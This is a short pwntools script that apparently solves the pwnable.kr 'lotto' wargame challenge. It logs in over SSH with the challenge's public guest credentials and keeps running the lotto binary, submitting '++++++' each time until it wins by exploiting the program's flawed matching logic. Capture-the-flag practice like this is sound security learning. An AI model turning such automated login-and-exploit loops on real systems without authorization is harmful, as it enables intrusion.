from pwn import *
payload_list = ['!', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/',
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?']
sh = ssh("lotto", "pwnable.kr", password="guest", port=2222)
while True:
    process = sh.process("./lotto")
    process.recv()
    process.sendline(b"1")
    process.recv()
    process.sendline("++++++".encode())
    _, output = process.recvlines(2)
    process.close()
    if not b"bad" in output:
        print(output)
        break
